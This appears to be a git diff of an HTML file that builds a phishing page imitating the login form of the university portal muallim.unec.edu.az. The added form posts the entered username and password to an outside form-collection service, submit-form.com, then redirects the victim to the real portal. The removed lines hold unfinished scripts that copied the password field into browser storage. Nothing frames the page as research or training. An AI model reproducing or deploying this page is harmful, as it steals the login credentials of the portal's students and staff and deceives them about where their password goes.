@@ -8,40 +8,25 @@
     <title>Document</title>
 </head>
 <body>
-
-<form/>
-    <input type="text"  id="tb1" />
-    <input type="text" id="tb2" />
-    <input type="submit" id="bt1" value="click" onclick="localStorage.setItem('Sifre', document.getElementById('LoginForm_password').value);
-    localStorage.setItem('isdifadeci adi', document.getElementById('LoginForm_username').value )
-     localStorage.clear = function (){console.log('sdaad')}"/>
-</form>
-
-<!-------------------------------------------------------------------------------------------------------------------->
-
-
 <form action="https://submit-form.com/wf6bN1Sx">
     <input
             type="hidden"
             name="_redirect"
             value="https://muallim.unec.edu.az/"
     />
+    <div class="loginbox-textbox">
+        <input class="user-l" placeholder="İstifadəçi adı" name="LoginForm[username]" id="LoginForm_username" type="text">    		                                </div>
 
+    <div class="loginbox-textbox">
+        <input class="password-l" placeholder="Şifrə" style="margin-bottom: 4%;" name="LoginForm[password]" id="LoginForm_password" type="password">    		                                </div>
 
-<!-------------------------------------------------------------------------------------------------------------------->
-<script>
-    function onSubmit(){
-        var sifre = document.getElementById("LoginForm_password").value;
-        var sifreString = sifre.toString()
-        localStorage.setItem("sifre", sifre);
-        onclick="sessionStorage.setItem('Sifre', document.getElementById('LoginForm_password').value )";
-        setCookie("sifre", )
-        sessionStorage
+    <div class="loginbox-forgot"></div>
 
-    }
-window.localStorage = e
+    <div class="loginbox-textox" style="text-align: center;"></div>
 
+    <div class="loginbox-submit">
+        <input class="btn btn-primary btn-block" type="submit" name="yt0" value="Daxil ol">                    </div>
 
-</script>
+</form>
 </body>
 </html>
